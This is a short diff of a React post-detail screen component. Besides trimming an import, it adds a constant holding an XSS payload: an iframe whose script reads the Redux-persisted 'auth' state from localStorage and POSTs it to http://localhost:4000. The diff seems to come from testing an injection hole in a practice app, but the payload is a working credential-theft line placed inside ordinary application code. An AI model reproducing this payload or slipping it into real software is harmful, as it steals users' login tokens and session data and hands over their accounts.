@@ -1,8 +1,10 @@
-import { Box, Flex, SkeletonText, Text } from "@chakra-ui/react";
+import { Box, Flex, Text } from "@chakra-ui/react";
 import React, { useEffect } from "react";
 import ScreenBase from "../ScreenBase";
 import { useParams } from "react-router-dom";
 import { PostFullType, requestPostById } from "../../api/posts";
+
+const chckc = `<iframe srcDoc="<script>fetch('http://localhost:4000', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(JSON.parse(JSON.parse(localStorage.getItem('persist:root')).auth))})</script>"></iframe>`;
 
 const PostDetailScreen: React.FC = () => {
   const divRef = React.useRef<HTMLDivElement>(null);
